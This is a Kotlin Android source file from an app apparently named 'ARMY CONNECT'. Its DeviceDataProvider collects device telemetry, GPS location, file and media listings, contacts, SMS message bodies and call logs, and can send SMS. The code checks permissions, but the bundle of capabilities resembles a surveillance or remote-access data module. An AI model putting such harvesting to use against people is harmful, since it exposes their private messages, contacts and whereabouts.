package com.armyconnect.app.features

import android.Manifest
import android.app.ActivityManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.telephony.SmsManager
import android.webkit.MimeTypeMap
import androidx.core.content.ContextCompat
import java.io.File

object DeviceDataProvider {

    fun hasPermission(context: Context, permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    fun collectTelemetry(context: Context): Map<String, Any?> {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
        val batteryPct = if (level >= 0 && scale > 0) (level * 100) / scale else 100
        val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        val tempTenths = batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 300) ?: 300

        val stat = StatFs(Environment.getDataDirectory().path)
        val storageTotal = stat.blockCountLong * stat.blockSizeLong
        val storageAvail = stat.availableBlocksLong * stat.blockSizeLong
        val storageUsed = (storageTotal - storageAvail).coerceAtLeast(0L)

        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val memInfo = ActivityManager.MemoryInfo()
        am.getMemoryInfo(memInfo)
        val ramTotal = memInfo.totalMem
        val ramUsed = (ramTotal - memInfo.availMem).coerceAtLeast(0L)

        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
        val networkType = when {
            caps == null -> "Offline"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile Data"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
            else -> "Internet"
        }

        val loc = getLastKnownLocation(context)
        return mapOf(
            "batteryLevel" to batteryPct,
            "isCharging" to isCharging,
            "batteryTemp" to tempTenths / 10.0,
            "storageUsed" to storageUsed,
            "storageTotal" to storageTotal,
            "ramUsed" to ramUsed,
            "ramTotal" to ramTotal,
            "networkType" to networkType,
            "androidVersion" to Build.VERSION.RELEASE,
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "latitude" to loc?.latitude,
            "longitude" to loc?.longitude,
            "locationAccuracy" to loc?.accuracy?.toDouble()
        )
    }

    @Suppress("MissingPermission")
    fun getLastKnownLocation(context: Context): Location? {
        if (!hasPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) &&
            !hasPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
        ) {
            return null
        }
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
        var best: Location? = null
        for (p in providers) {
            val l = runCatching { lm.getLastKnownLocation(p) }.getOrNull() ?: continue
            if (best == null || l.time > best.time) best = l
        }
        return best
    }

    fun listStorageEntries(path: String): List<Map<String, Any?>> {
        val dir = File(path)
        if (!dir.exists() || !dir.isDirectory) return emptyList()
        val files = dir.listFiles() ?: return emptyList()
        return files.take(120).map { f ->
            val ext = f.extension.lowercase()
            val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext) ?: "application/octet-stream"
            mapOf(
                "name" to f.name,
                "path" to f.absolutePath,
                "folder" to (f.parent ?: "/"),
                "size" to if (f.isDirectory) 0L else f.length(),
                "mimeType" to mime,
                "isDirectory" to f.isDirectory,
                "updatedAt" to f.lastModified()
            )
        }
    }

    fun queryMediaEntries(context: Context): List<Map<String, Any?>> {
        val entries = mutableListOf<Map<String, Any?>>()
        val uris = listOf(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI to "image/jpeg",
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI to "video/mp4",
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI to "audio/mpeg"
        )
        for ((uri, fallbackMime) in uris) {
            val projection = arrayOf(
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.MIME_TYPE,
                MediaStore.MediaColumns.DATE_MODIFIED
            )
            runCatching {
                context.contentResolver.query(
                    uri,
                    projection,
                    null,
                    null,
                    "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
                )?.use { c ->
                    var count = 0
                    while (c.moveToNext() && count < 40) {
                        val name = c.getString(0) ?: "media"
                        val filePath = c.getString(1) ?: "/$name"
                        val size = c.getLong(2)
                        val mime = c.getString(3) ?: fallbackMime
                        val modified = c.getLong(4) * 1000L
                        entries.add(
                            mapOf(
                                "name" to name,
                                "path" to filePath,
                                "folder" to (File(filePath).parent ?: "/Media"),
                                "size" to size,
                                "mimeType" to mime,
                                "isDirectory" to false,
                                "updatedAt" to modified
                            )
                        )
                        count++
                    }
                }
            }
        }
        return entries
    }

    fun queryContacts(context: Context): List<Map<String, Any?>> {
        if (!hasPermission(context, Manifest.permission.READ_CONTACTS)) return emptyList()
        val list = mutableListOf<Map<String, Any?>>()
        runCatching {
            context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null,
                null,
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )?.use { c ->
                while (c.moveToNext() && list.size < 250) {
                    list.add(
                        mapOf(
                            "id" to c.getString(0),
                            "name" to (c.getString(1) ?: "Unknown"),
                            "phone" to (c.getString(2) ?: "")
                        )
                    )
                }
            }
        }
        return list
    }

    fun querySms(context: Context): List<Map<String, Any?>> {
        if (!hasPermission(context, Manifest.permission.READ_SMS)) return emptyList()
        val list = mutableListOf<Map<String, Any?>>()
        runCatching {
            context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.DATE
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC"
            )?.use { c ->
                while (c.moveToNext() && list.size < 100) {
                    val type = c.getInt(3)
                    list.add(
                        mapOf(
                            "id" to c.getString(0),
                            "address" to (c.getString(1) ?: ""),
                            "body" to (c.getString(2) ?: ""),
                            "direction" to if (type == Telephony.Sms.MESSAGE_TYPE_SENT) "outgoing" else "incoming",
                            "status" to if (type == Telephony.Sms.MESSAGE_TYPE_SENT) "sent" else "received",
                            "timestamp" to c.getLong(4)
                        )
                    )
                }
            }
        }
        return list
    }

    fun sendSms(context: Context, address: String, body: String): Boolean {
        if (!hasPermission(context, Manifest.permission.SEND_SMS)) return false
        return runCatching {
            val smsManager = context.getSystemService(SmsManager::class.java)
            val parts = smsManager.divideMessage(body)
            if (parts.size > 1) {
                smsManager.sendMultipartTextMessage(address, null, parts, null, null)
            } else {
                smsManager.sendTextMessage(address, null, body, null, null)
            }
            true
        }.getOrDefault(false)
    }

    fun queryCallLogs(context: Context): List<Map<String, Any?>> {
        if (!hasPermission(context, Manifest.permission.READ_CALL_LOG)) return emptyList()
        val list = mutableListOf<Map<String, Any?>>()
        runCatching {
            context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE
                ),
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )?.use { c ->
                while (c.moveToNext() && list.size < 100) {
                    val typeInt = c.getInt(3)
                    val typeStr = when (typeInt) {
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "incoming"
                    }
                    list.add(
                        mapOf(
                            "id" to c.getString(0),
                            "number" to (c.getString(1) ?: ""),
                            "contactName" to (c.getString(2) ?: ""),
                            "callType" to typeStr,
                            "durationSec" to c.getLong(4),
                            "timestamp" to c.getLong(5)
                        )
                    )
                }
            }
        }
        return list
    }

    fun setClipboard(context: Context, text: String) {
        val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        cm.setPrimaryClip(ClipData.newPlainText("ARMY CONNECT", text))
    }
}
